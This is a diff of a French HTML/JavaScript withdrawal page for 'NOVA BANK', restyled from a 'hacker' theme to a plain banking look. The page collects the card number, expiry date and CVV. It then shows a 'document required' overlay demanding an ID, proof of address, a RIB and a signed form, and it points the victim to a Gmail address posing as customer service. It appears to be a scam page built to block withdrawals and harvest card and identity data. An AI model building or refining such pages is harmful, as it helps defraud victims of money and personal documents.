@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>NOVA BANK - Retrait sécurisé</title>
+    <title>NOVA BANK - Retrait</title>
     <style>
         * {
             margin: 0;
@@ -13,107 +13,35 @@
         }
 
         body {
-            background: #0a0f1f;
+            background: #f5f7fc;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        /* Effet de grille style hacker */
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: 
-                linear-gradient(rgba(255, 82, 82, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255, 82, 82, 0.03) 1px, transparent 1px);
-            background-size: 50px 50px;
-            pointer-events: none;
-        }
-
-        /* Lignes de code animées */
-        .code-lines {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 100%;
-            overflow: hidden;
-            pointer-events: none;
-        }
-
-        .code-lines span {
-            position: absolute;
-            color: rgba(255, 82, 82, 0.1);
-            font-family: monospace;
-            font-size: 14px;
-            white-space: nowrap;
-            animation: scroll 20s linear infinite;
-        }
-
-        @keyframes scroll {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100vh); }
         }
 
         .container {
-            max-width: 550px;
+            max-width: 500px;
             width: 100%;
-            background: rgba(11, 26, 47, 0.95);
-            backdrop-filter: blur(10px);
+            background: white;
             border-radius: 40px;
             overflow: hidden;
-            border: 2px solid #ff5252;
-            box-shadow: 0 0 40px rgba(255, 82, 82, 0.3);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
             position: relative;
-            z-index: 10;
-            animation: glitch 0.3s ease;
-        }
-
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-            100% { transform: translate(0); }
         }
 
         .header {
             background: #0b1a2f;
             padding: 30px;
             text-align: center;
-            border-bottom: 3px solid #ff5252;
-            position: relative;
-        }
-
-        .header::after {
-            content: 'SECURE CONNECTION';
-            position: absolute;
-            bottom: -10px;
-            left: 20px;
-            color: #ff5252;
-            font-size: 0.7rem;
-            font-family: monospace;
-            background: #0b1a2f;
-            padding: 2px 10px;
-            border-radius: 10px;
-            border: 1px solid #ff5252;
+            border-bottom: 4px solid #ff5252;
         }
 
         .logo {
-            font-size: 2.5rem;
+            font-size: 2.2rem;
             font-weight: 800;
             color: white;
-            letter-spacing: 4px;
-            text-shadow: 0 0 10px rgba(255, 82, 82, 0.5);
         }
 
         .logo span {
@@ -121,311 +49,220 @@
         }
 
         .content {
-            padding: 40px;
+            padding: 30px;
+            transition: all 0.3s ease;
+        }
+
+        .content.blur {
+            filter: blur(4px);
+            pointer-events: none;
         }
 
         .title {
-            font-size: 2rem;
-            color: #ff5252;
-            font-weight: 700;
+            font-size: 1.8rem;
+            color: #0b1a2f;
             margin-bottom: 10px;
-            font-family: monospace;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 0 0 10px rgba(255, 82, 82, 0.5);
+            font-weight: 700;
         }
 
         .subtitle {
-            color: #8e9daf;
-            margin-bottom: 30px;
-            font-size: 0.9rem;
+            color: #6f7d95;
+            margin-bottom: 25px;
             border-left: 4px solid #ff5252;
             padding-left: 15px;
-            font-family: monospace;
         }
 
         .balance-card {
-            background: rgba(255, 82, 82, 0.1);
-            border: 2px solid #ff5252;
+            background: #f0f4ff;
             border-radius: 30px;
-            padding: 25px;
-            margin-bottom: 30px;
+            padding: 20px;
+            margin-bottom: 25px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            backdrop-filter: blur(5px);
-            box-shadow: 0 0 20px rgba(255, 82, 82, 0.2);
         }
 
         .balance-label {
-            color: #ff5252;
+            color: #0b1a2f;
             font-weight: 600;
             font-size: 1rem;
-            font-family: monospace;
         }
 
-        .balance-value {
-            font-size: 2.5rem;
+        .balance-amount {
+            font-size: 2rem;
             font-weight: 700;
-            color: white;
-            text-shadow: 0 0 15px rgba(255, 82, 82, 0.5);
+            color: #0b1a2f;
         }
 
-        .balance-value small {
+        .balance-amount span {
             font-size: 1rem;
             color: #8e9daf;
+            font-weight: 400;
         }
 
         .form-group {
-            margin-bottom: 25px;
-            position: relative;
+            margin-bottom: 20px;
         }
 
         .form-group label {
             display: block;
-            margin-bottom: 10px;
-            color: #ff5252;
+            margin-bottom: 8px;
+            color: #0b1a2f;
             font-weight: 600;
-            font-size: 0.9rem;
-            margin-left: 8px;
-            font-family: monospace;
-            letter-spacing: 1px;
+            font-size: 0.95rem;
+            margin-left: 6px;
         }
 
         .form-group input, .form-group select {
             width: 100%;
-            padding: 18px 22px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid #ff5252;
-            border-radius: 50px;
-            font-size: 1.1rem;
+            padding: 16px 20px;
+            border: 2px solid #e6ecf2;
+            border-radius: 40px;
+            font-size: 1rem;
             transition: all 0.3s;
-            color: white;
-            font-family: monospace;
+            background: #f9fcff;
         }
 
         .form-group input:focus, .form-group select:focus {
             outline: none;
-            border-color: #ff5252;
-            box-shadow: 0 0 30px rgba(255, 82, 82, 0.3);
-            background: rgba(255, 82, 82, 0.1);
-        }
-
-        .form-group input::placeholder {
-            color: rgba(255, 255, 255, 0.3);
-        }
-
-        .form-group select option {
-            background: #0b1a2f;
-            color: white;
+            border-color: #0b1a2f;
+            box-shadow: 0 5px 15px rgba(11,26,47,0.1);
         }
 
         .btn-withdraw {
             width: 100%;
-            padding: 20px;
-            background: #ff5252;
+            padding: 18px;
+            background: #0b1a2f;
             color: white;
             border: none;
-            border-radius: 50px;
-            font-size: 1.3rem;
-            font-weight: 700;
+            border-radius: 40px;
+            font-size: 1.1rem;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
             margin: 20px 0;
-            letter-spacing: 2px;
-            font-family: monospace;
-            text-transform: uppercase;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn-withdraw::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
-                transparent,
-                rgba(255, 255, 255, 0.3),
-                transparent
-            );
-            transform: rotate(45deg);
-            animation: shine 3s infinite;
-        }
-
-        @keyframes shine {
-            0% { left: -50%; }
-            100% { left: 150%; }
         }
 
         .btn-withdraw:hover {
-            background: #ff3333;
+            background: #1e3a5f;
             transform: translateY(-3px);
-            box-shadow: 0 0 40px #ff5252;
+            box-shadow: 0 10px 20px rgba(11,26,47,0.2);
         }
 
-        /* Message de sécurité style hacker */
-        .security-message {
-            background: rgba(0, 0, 0, 0.9);
-            border: 3px solid #ff5252;
-            border-radius: 30px;
-            padding: 30px;
-            margin-top: 30px;
-            display: none;
-            position: relative;
-            overflow: hidden;
+        .back-link {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            color: #8e9daf;
+            text-decoration: none;
+            font-weight: 500;
         }
 
-        .security-message::before {
-            content: '';
-            position: absolute;
+        .back-link:hover {
+            color: #ff5252;
+        }
+
+        /* Overlay pour le message */
+        .overlay {
+            position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: repeating-linear-gradient(
-                0deg,
-                rgba(255, 82, 82, 0.1) 0px,
-                rgba(255, 82, 82, 0.1) 2px,
-                transparent 2px,
-                transparent 4px
-            );
-            pointer-events: none;
-        }
-
-        .security-message.show {
-            display: block;
-            animation: hackEffect 0.5s ease;
-        }
-
-        @keyframes hackEffect {
-            0% { 
-                opacity: 0;
-                transform: scale(0.9);
-                filter: blur(5px);
-            }
-            50% { 
-                opacity: 0.5;
-                transform: scale(1.02);
-                filter: blur(2px);
-            }
-            100% { 
-                opacity: 1;
-                transform: scale(1);
-                filter: blur(0);
-            }
-        }
-
-        .glitch-container {
-            display: flex;
+            background: rgba(0,0,0,0.7);
+            display: none;
+            align-items: center;
             justify-content: center;
-            margin-bottom: 20px;
-            position: relative;
+            z-index: 1000;
+            backdrop-filter: blur(5px);
         }
 
-        .glitch {
-            font-size: 6rem;
+        .overlay.show {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .message-card {
+            background: white;
+            border-radius: 40px;
+            padding: 40px;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            animation: slideUp 0.4s ease;
+            border: 3px solid #ff5252;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .exclamation {
+            width: 80px;
+            height: 80px;
+            background: #ff5252;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .exclamation span {
+            color: white;
+            font-size: 3.5rem;
             font-weight: 800;
-            color: #ff5252;
-            position: relative;
-            text-shadow: 
-                2px 2px 0 #ff0000,
-                -2px -2px 0 #00ff00;
-            animation: glitchText 0.3s infinite;
         }
 
-        @keyframes glitchText {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-            100% { transform: translate(0); }
-        }
-
-        .glitch::before,
-        .glitch::after {
-            content: attr(data-text);
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-        }
-
-        .glitch::before {
-            animation: glitchTop 0.3s infinite linear;
-            clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
-            color: #00ff00;
-        }
-
-        .glitch::after {
-            animation: glitchBottom 0.3s infinite linear;
-            clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%);
-            color: #0000ff;
-        }
-
-        @keyframes glitchTop {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, -2px); }
-            40% { transform: translate(2px, 2px); }
-            60% { transform: translate(-2px, -2px); }
-            80% { transform: translate(2px, 2px); }
-            100% { transform: translate(0); }
-        }
-
-        @keyframes glitchBottom {
-            0% { transform: translate(0); }
-            20% { transform: translate(2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(-2px, -2px); }
-            100% { transform: translate(0); }
-        }
-
-        .security-title {
+        .message-card h2 {
             color: #ff5252;
             font-size: 1.8rem;
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: 20px;
-            font-family: monospace;
-            text-transform: uppercase;
-            text-shadow: 0 0 10px #ff5252;
+            margin-bottom: 15px;
         }
 
-        .security-text {
-            color: #8e9daf;
-            font-size: 1rem;
-            line-height: 1.8;
-            text-align: center;
+        .message-card p {
+            color: #0b1a2f;
+            font-size: 1.1rem;
+            line-height: 1.6;
             margin-bottom: 25px;
-            font-family: monospace;
-            border: 1px dashed #ff5252;
-            padding: 15px;
-            border-radius: 20px;
         }
 
         .doc-list {
-            background: rgba(255, 82, 82, 0.1);
-            border-radius: 20px;
+            background: #f9fcff;
+            border-radius: 30px;
             padding: 20px;
-            margin: 25px 0;
+            margin: 20px 0;
+            text-align: left;
             list-style: none;
-            border: 1px solid #ff5252;
         }
 
         .doc-list li {
             padding: 12px 0;
-            border-bottom: 1px solid rgba(255, 82, 82, 0.3);
-            color: white;
+            border-bottom: 1px solid #eef2f6;
+            color: #0b1a2f;
             font-weight: 500;
             display: flex;
             align-items: center;
             gap: 10px;
-            font-family: monospace;
         }
 
         .doc-list li:last-child {
@@ -433,206 +270,161 @@
         }
 
         .doc-list li::before {
-            content: ">";
+            content: "•";
             color: #ff5252;
             font-weight: bold;
-            font-size: 1.2rem;
+            font-size: 1.5rem;
         }
 
         .btn-contact {
             width: 100%;
             padding: 18px;
-            background: transparent;
-            color: #ff5252;
-            border: 2px solid #ff5252;
-            border-radius: 50px;
-            font-size: 1.2rem;
-            font-weight: 700;
+            background: #ff5252;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            font-size: 1.1rem;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
             margin: 15px 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            font-family: monospace;
-            text-transform: uppercase;
-            letter-spacing: 2px;
         }
 
         .btn-contact:hover {
-            background: #ff5252;
-            color: white;
-            box-shadow: 0 0 30px #ff5252;
+            background: #ff3333;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(255,82,82,0.3);
         }
 
-        .warning-text {
-            text-align: center;
-            color: #ff5252;
-            font-size: 0.9rem;
-            margin-top: 15px;
-            font-family: monospace;
-            animation: blink 1s infinite;
+        .btn-close {
+            background: transparent;
+            border: 2px solid #e6ecf2;
+            color: #0b1a2f;
+            padding: 12px 30px;
+            border-radius: 40px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
         }
 
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-
-        .back-link {
-            display: block;
-            text-align: center;
-            margin-top: 25px;
-            color: #8e9daf;
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s;
-            font-family: monospace;
-        }
-
-        .back-link:hover {
-            color: #ff5252;
+        .btn-close:hover {
+            background: #f0f4ff;
+            border-color: #0b1a2f;
         }
 
         .alert {
-            padding: 15px 20px;
-            border-radius: 50px;
+            padding: 15px;
+            border-radius: 40px;
             margin-bottom: 20px;
             display: none;
             font-weight: 500;
             text-align: center;
-            font-family: monospace;
         }
 
         .alert-error {
-            background: rgba(255, 82, 82, 0.2);
+            background: #ffeae8;
             color: #ff5252;
-            border: 2px solid #ff5252;
+            border: 1px solid #ffcdc8;
         }
 
         .footer {
             text-align: center;
-            margin-top: 30px;
+            margin-top: 20px;
             color: #8e9daf;
-            font-size: 0.8rem;
-            font-family: monospace;
-        }
-
-        .terminal-text {
-            color: #00ff00;
-            font-size: 0.8rem;
-            margin-top: 10px;
-            font-family: monospace;
-            text-align: left;
+            font-size: 0.9rem;
         }
     </style>
 </head>
 <body>
-    <div class="code-lines">
-        <span style="left: 10%; animation-delay: 0s;">> ACCESSING SECURE SERVER...</span>
-        <span style="left: 30%; animation-delay: 2s;">> ENCRYPTION LEVEL: 256-bit</span>
-        <span style="left: 50%; animation-delay: 4s;">> FIREWALL STATUS: ACTIVE</span>
-        <span style="left: 70%; animation-delay: 6s;">> CONNECTION SECURE</span>
-        <span style="left: 20%; animation-delay: 8s;">> PROCESSING REQUEST...</span>
-        <span style="left: 80%; animation-delay: 10s;">> VERIFYING IDENTITY</span>
-        <span style="left: 40%; animation-delay: 12s;">> SSL CERTIFICATE VALID</span>
-        <span style="left: 60%; animation-delay: 14s;">> PROTOCOL: HTTPS 2.0</span>
-    </div>
-
     <div class="container">
         <div class="header">
             <div class="logo">NOVA<span>BANK</span></div>
-            <div class="terminal-text">> SECURE TERMINAL v2.0</div>
         </div>
 
-        <div class="content">
-            <h1 class="title">> RETRAIT FONDS_</h1>
-            <div class="subtitle">
-                > INITIALISATION DU TRANSFERT_
-            </div>
-
+        <div class="content" id="mainContent">
             <div class="alert" id="alertMessage"></div>
+
+            <h1 class="title">Retrait d'argent</h1>
+            <div class="subtitle">
+                Effectuez votre retrait en toute sécurité
+            </div>
 
             <!-- Solde -->
             <div class="balance-card">
-                <span class="balance-label">> SOLDE DISPONIBLE</span>
-                <span class="balance-value" id="userBalance">1.250,00 <small>EUR</small></span>
+                <span class="balance-label">Solde disponible</span>
+                <span class="balance-amount" id="userBalance">1.250,00 <span>EUR</span></span>
             </div>
 
-            <form id="withdrawForm">
-                <div class="form-group">
-                    <label>> MONTANT DU RETRAIT (EUR)</label>
-                    <input type="number" id="withdrawAmount" placeholder="> ENTREZ LE MONTANT">
-                </div>
-
-                <div class="form-group">
-                    <label>> COMPTE À DÉBITER</label>
-                    <select id="withdrawAccount">
-                        <option value="current">> COMPTE COURANT • **** **** 5678</option>
-                        <option value="savings">> COMPTE ÉPARGNE • **** **** 9012</option>
-                    </select>
-                </div>
-
-                <div class="form-group">
-                    <label>> NUMÉRO DE CARTE</label>
-                    <input type="text" id="cardNumber" placeholder="> XXXX XXXX XXXX XXXX">
-                </div>
-
-                <div class="form-group">
-                    <label>> DATE D'EXPIRATION</label>
-                    <input type="text" id="cardExpiry" placeholder="> MM/AA">
-                </div>
-
-                <div class="form-group">
-                    <label>> CVV</label>
-                    <input type="text" id="cardCVV" placeholder="> XXX">
-                </div>
-
-                <button type="button" class="btn-withdraw" onclick="processWithdraw()">
-                    > EXÉCUTER LE RETRAIT_
-                </button>
-            </form>
-
-            <!-- Message de sécurité style hacker -->
-            <div class="security-message" id="securityMessage">
-                <div class="glitch-container">
-                    <div class="glitch" data-text="!">!</div>
-                </div>
-                
-                <h2 class="security-title">> PROTOCOLE DE SÉCURITÉ_</h2>
-                
-                <div class="security-text">
-                    > ALERTE ! DOCUMENT DE CONFIRMATION REQUIS<br>
-                    > CODE ERREUR: 0x7E5 0x2A1 0x9F3<br>
-                    > NIVEAU DE SÉCURITÉ RENFORCÉ
-                </div>
-
-                <ul class="doc-list">
-                    <li>> PIÈCE D'IDENTITÉ [REQUIS]</li>
-                    <li>> JUSTIFICATIF DE DOMICILE [REQUIS]</li>
-                    <li>> RIB BÉNÉFICIAIRE [REQUIS]</li>
-                    <li>> FORMULAIRE SIGNÉ [REQUIS]</li>
-                </ul>
-
-                <div class="terminal-text" style="text-align: center; color: #ff5252; margin: 20px 0;">
-                    > DÉLAI DE TRAITEMENT: 24-48H
-                </div>
-
-                <button class="btn-contact" onclick="contactSupport()">
-                    > CONTACTER LE SUPPORT SÉCURISÉ_
-                </button>
-
-                <div class="warning-text">
-                    > TRANSFERT BLOQUÉ - ACTION REQUISE
-                </div>
+            <div class="form-group">
+                <label>Montant du retrait</label>
+                <input type="number" id="withdrawAmount" placeholder="Ex: 500" value="100">
             </div>
 
-            <a href="dashboard.html" class="back-link">> RETOUR AU TABLEAU DE BORD_</a>
+            <div class="form-group">
+                <label>Compte à débiter</label>
+                <select id="withdrawAccount">
+                    <option value="current">Compte courant • ****5678</option>
+                    <option value="savings">Compte épargne • ****9012</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Numéro de carte bancaire</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456">
+            </div>
+
+            <div class="form-group">
+                <label>Date d'expiration</label>
+                <input type="text" id="cardExpiry" placeholder="MM/AA">
+            </div>
+
+            <div class="form-group">
+                <label>CVV</label>
+                <input type="text" id="cardCVV" placeholder="123">
+            </div>
+
+            <button class="btn-withdraw" onclick="processWithdraw()">
+                EFFECTUER LE RETRAIT
+            </button>
+
+            <a href="dashboard.html" class="back-link">← Retour au tableau de bord</a>
             
             <div class="footer">
-                > NOVA BANK • SYSTÈME SÉCURISÉ • TOUTES LES TRANSACTIONS SONT SURVEILLÉES
+                NOVA BANK - Sécurité garantie
             </div>
+        </div>
+    </div>
+
+    <!-- Overlay avec message -->
+    <div class="overlay" id="securityOverlay">
+        <div class="message-card">
+            <div class="exclamation">
+                <span>!</span>
+            </div>
+            
+            <h2>Document requis</h2>
+            
+            <p>Pour des raisons de sécurité, un document de confirmation est nécessaire pour valider votre retrait.</p>
+
+            <ul class="doc-list">
+                <li>Pièce d'identité</li>
+                <li>Justificatif de domicile</li>
+                <li>RIB du compte</li>
+                <li>Formulaire signé</li>
+            </ul>
+
+            <p style="color: #ff5252; font-weight: 600; margin: 15px 0;">
+                ⏱️ Délai: 24-48h après réception
+            </p>
+
+            <button class="btn-contact" onclick="contactSupport()">
+                CONTACTER LE SERVICE CLIENT
+            </button>
+
+            <button class="btn-close" onclick="closeOverlay()">
+                FERMER
+            </button>
         </div>
     </div>
 
@@ -659,7 +451,7 @@
 
                     if (!error && data) {
                         userBalance = data.solde || 0;
-                        document.getElementById('userBalance').textContent = userBalance.toFixed(2).replace('.', ',') + ' <small>EUR</small>';
+                        document.getElementById('userBalance').innerHTML = userBalance.toFixed(2).replace('.', ',') + ' <span>EUR</span>';
                     }
                 }
             } catch (error) {
@@ -669,7 +461,7 @@
 
         function showAlert(message, type) {
             const alert = document.getElementById('alertMessage');
-            alert.textContent = '> ' + message;
+            alert.textContent = message;
             alert.className = `alert alert-${type}`;
             alert.style.display = 'block';
             
@@ -686,68 +478,59 @@
 
             // Validations simples
             if (!amount || amount <= 0) {
-                showAlert('MONTANT INVALIDE', 'error');
+                showAlert('Veuillez entrer un montant valide', 'error');
                 return;
             }
 
-            if (!cardNumber || cardNumber.length < 16) {
-                showAlert('NUMÉRO DE CARTE INVALIDE', 'error');
+            if (!cardNumber) {
+                showAlert('Veuillez entrer votre numéro de carte', 'error');
                 return;
             }
 
             if (!cardExpiry) {
-                showAlert('DATE D\'EXPIRATION INVALIDE', 'error');
+                showAlert('Veuillez entrer la date d\'expiration', 'error');
                 return;
             }
 
-            if (!cardCVV || cardCVV.length < 3) {
-                showAlert('CVV INVALIDE', 'error');
+            if (!cardCVV) {
+                showAlert('Veuillez entrer le CVV', 'error');
                 return;
             }
 
             if (amount > userBalance) {
-                showAlert('SOLDE INSUFFISANT', 'error');
+                showAlert('Solde insuffisant pour ce retrait', 'error');
                 return;
             }
 
-            // Afficher le message de sécurité avec effet hacker
-            const securityMsg = document.getElementById('securityMessage');
-            securityMsg.classList.remove('show');
-            
-            setTimeout(() => {
-                securityMsg.classList.add('show');
-                securityMsg.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                
-                // Effet de glitch supplémentaire
-                document.querySelector('.glitch').style.animation = 'glitchText 0.1s infinite';
-                setTimeout(() => {
-                    document.querySelector('.glitch').style.animation = 'glitchText 0.3s infinite';
-                }, 500);
-            }, 100);
+            // Afficher l'overlay et flouter le contenu
+            document.getElementById('mainContent').classList.add('blur');
+            document.getElementById('securityOverlay').classList.add('show');
+        }
+
+        function closeOverlay() {
+            document.getElementById('securityOverlay').classList.remove('show');
+            document.getElementById('mainContent').classList.remove('blur');
         }
 
         function contactSupport() {
-            const amount = document.getElementById('withdrawAmount').value || 'NON SPÉCIFIÉ';
+            const amount = document.getElementById('withdrawAmount').value;
             
-            const sujet = encodeURIComponent('DEMANDE DE DOCUMENT DE CONFIRMATION - RETRAIT BLOQUÉ');
+            const sujet = encodeURIComponent('Demande de document de retrait');
             const message = encodeURIComponent(
-                `> PROTOCOLE DE SÉCURITÉ ACTIVÉ\n\n` +
-                `> IDENTIFIANT DE TRANSACTION: ${Math.random().toString(36).substring(7).toUpperCase()}\n` +
-                `> MONTANT BLOQUÉ: ${amount} EUR\n` +
-                `> TIMESTAMP: ${new Date().toLocaleString()}\n\n` +
-                `> DOCUMENTS REQUIS POUR DÉBLOQUER LE RETRAIT:\n` +
-                `> - PIÈCE D'IDENTITÉ\n` +
-                `> - JUSTIFICATIF DE DOMICILE\n` +
-                `> - RIB\n` +
-                `> - FORMULAIRE SIGNÉ\n\n` +
-                `> VEUILLEZ ENVOYER LES DOCUMENTS POUR DÉBLOQUER LE TRANSFERT.\n\n` +
-                `> CORDIALEMENT,\n` +
-                `> SYSTÈME DE SÉCURITÉ NOVA BANK`
+                `Bonjour,\n\n` +
+                `Je souhaite effectuer un retrait de ${amount} € et j'ai besoin du document de confirmation.\n\n` +
+                `Merci de me faire parvenir les instructions.\n\n` +
+                `Cordialement.`
             );
             
             window.location.href = `mailto:Serviceclient08987@gmail.com?subject=${sujet}&body=${message}`;
             
-            showAlert('> REDIRECTION VERS LE CANAL SÉCURISÉ...', 'success');
+            showAlert('Redirection vers votre client mail...', 'success');
+            
+            // Fermer l'overlay après 2 secondes
+            setTimeout(() => {
+                closeOverlay();
+            }, 2000);
         }
 
         loadUserBalance();
